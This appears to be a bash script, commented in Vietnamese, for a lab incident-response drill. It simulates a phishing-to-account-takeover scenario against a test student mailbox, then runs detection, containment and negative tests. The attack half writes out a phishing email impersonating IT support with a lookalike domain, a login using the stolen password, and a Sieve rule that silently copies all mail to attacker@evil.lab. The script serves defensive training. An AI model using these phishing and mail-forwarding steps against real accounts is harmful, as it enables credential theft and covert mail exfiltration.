#!/bin/bash
# Credentials tu ../.env (copy tu env.example). Khong commit secret.
set -a; . "$(dirname "$0")/../.env" 2>/dev/null || true; set +a
CONTAIN_PW="Contained_$(openssl rand -hex 4 2>/dev/null || echo abcd1234)"
RECOVER_PW="Recovered_$(openssl rand -hex 4 2>/dev/null || echo abcd1234)"
# ===== DIỄN TẬP D1: phishing -> chiếm quyền -> persistence -> phát hiện -> kiểm soát -> kiểm thử âm tính
# Cấu hình v1. Nạn nhân: sv01@st.uni.lab (SV, không MFA). Mật khẩu bị lộ qua phishing: "$USER_PW"
set -u
ts(){ date -u +"%Y-%m-%dT%H:%M:%SZ"; }
KC="docker exec keycloak /opt/keycloak/bin/kcadm.sh"
$KC config credentials --server https://localhost:8443 --realm master --user admin \
  --password "${KC_ADMIN_PASSWORD:?set in .env}" --truststore /opt/keycloak/data/kc-trust.p12 --trustpass changeit >/dev/null 2>&1
SVID=$($KC get users -r uni -q username=sv01 --fields id | grep -oE '[0-9a-f-]{36}' | head -1)
imap_try(){ # pass -> prints OK/FAIL
python3 - "$1" <<'PY'
import imaplib,ssl,sys
ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
try:
  m=imaplib.IMAP4_SSL("127.0.0.1",993,ssl_context=ctx);m.login("sv01@st.uni.lab",sys.argv[1])
  m.select("INBOX");t,d=m.search(None,"ALL");print("OK (%d thư)"%len(d[0].split()));m.logout()
except Exception as e: print("FAIL (%s)"%str(e)[:40])
PY
}

echo "################## DIỄN TẬP D1 — phishing -> chiếm quyền (v1) ##################"
echo "[T0 $(ts)] Gửi email phishing tới sv01 (mạo danh Phòng CNTT)"
python3 - <<'PY'
import smtplib
msg=("From: IT Support <it-support@uni-lab.support>\r\n"
     "To: sv01@st.uni.lab\r\n"
     "Subject: [KHAN] Xac minh lai tai khoan email trong 24h\r\n\r\n"
     "Chao ban, he thong phat hien dang nhap bat thuong.\r\n"
     "Vui long xac minh tai khoan: http://login.uni-lab.support/verify?u=sv01\r\n"
     "Neu khong tai khoan se bi khoa. -- Phong CNTT\r\n")
s=smtplib.SMTP("127.0.0.1",25,timeout=20)
s.sendmail("it-support@uni-lab.support",["sv01@st.uni.lab"],msg);s.quit()
print("  -> phishing email ĐÃ GỬI")
PY

echo "[T0 $(ts)] (Nạn nhân nhập mật khẩu vào trang giả) -> kẻ tấn công có "$USER_PW""
echo "[T0 $(ts)] Kẻ tấn công đăng nhập IMAP bằng credential đánh cắp:"
echo "   kết quả: $(imap_try "${USER_PW:?set in .env}")  => CHIẾM QUYỀN THÀNH CÔNG"

echo "[T0 $(ts)] Cài persistence: quy tắc chuyển tiếp lén qua Sieve -> attacker@evil.lab"
docker exec -i dms bash -c '
cat > /tmp/evil.sieve <<SIEVE
require ["copy"];
if true { redirect :copy "attacker@evil.lab"; }
SIEVE
doveadm sieve put -u sv01@st.uni.lab evilrule < /tmp/evil.sieve 2>&1
doveadm sieve activate -u sv01@st.uni.lab evilrule 2>&1
echo "   -- Sieve script đang hoạt động của sv01 --"
doveadm sieve list -u sv01@st.uni.lab 2>&1 | sed "s/^/     /"'

echo
echo "[T1 $(ts)] PHÁT HIỆN: đăng nhập IMAP + sự kiện"
echo "   -- mail.log: phiên IMAP gần đây của sv01 --"
docker exec dms bash -c 'grep -iE "imap-login.*sv01|Login: user=<sv01" /var/log/mail/mail.log 2>/dev/null | tail -3' | sed 's/^/     /'

echo "[T2 $(ts)] PHÂN MỨC: P3 (một tài khoản SV, có persistence) -> xử lý kiểm soát"

echo "[T3 $(ts)] KIỂM SOÁT 2 LỚP:"
echo "   (1) Keycloak: vô hiệu hóa user + đăng xuất phiên"
$KC update users/$SVID -r uni -s "enabled=false" 2>&1 && echo "       -> enabled=false"
$KC create users/$SVID/logout -r uni 2>&1 >/dev/null && echo "       -> logout sessions" || echo "       -> logout sessions (sent)"
echo "   (2) Mail: đổi mật khẩu + kick phiên + xóa quy tắc chuyển tiếp"
docker exec dms setup email update sv01@st.uni.lab "$CONTAIN_PW" >/dev/null 2>&1 && echo "       -> đổi mật khẩu hộp thư"
docker exec dms doveadm kick sv01@st.uni.lab 2>&1 | sed 's/^/       /'
docker exec dms bash -c 'doveadm sieve deactivate -u sv01@st.uni.lab 2>/dev/null; doveadm sieve delete -u sv01@st.uni.lab evilrule 2>&1; echo "       -> Sieve sau khi xóa:"; doveadm sieve list -u sv01@st.uni.lab 2>&1 | sed "s/^/          /"'

echo
echo "[T3 $(ts)] 5 PHÉP THỬ ÂM TÍNH (tất cả phải BỊ CHẶN):"
echo "   1. IMAP mật khẩu cũ ("$USER_PW"): $(imap_try "${USER_PW:?set in .env}")  (mong đợi FAIL)"
echo -n "   2. Keycloak login mật khẩu cũ: "
code=$(curl -sk --resolve sso.uni.lab:8443:127.0.0.1 -o /dev/null -w '%{http_code}' -d client_id=admin-cli -d grant_type=password --data-urlencode username=sv01 --data-urlencode 'password="$USER_PW"' https://sso.uni.lab:8443/realms/uni/protocol/openid-connect/token); echo "http=$code (401/400=BỊ CHẶN do user disabled)"
echo "   3. MFA kẻ tấn công tự đăng ký: N/A (sv01 không có MFA)"
echo "   4. IMAP mật khẩu mới (giả sử lộ tiếp): $(imap_try "$CONTAIN_PW")  (chỉ để xác nhận mật khẩu đã đổi)"
echo "   5. Quy tắc chuyển tiếp còn không: $(docker exec dms doveadm sieve list -u sv01@st.uni.lab 2>&1 | grep -c evilrule) (0 = đã xóa)"

echo
echo "[T4 $(ts)] LOẠI BỎ xong (persistence đã gỡ). [T5] Khôi phục: cấp mật khẩu mới + bật lại user khi chủ TK xác minh."
echo "[T6 $(ts)] (Đóng sự cố sau khi điền biểu mẫu)"
echo "################## HẾT D1 ##################"
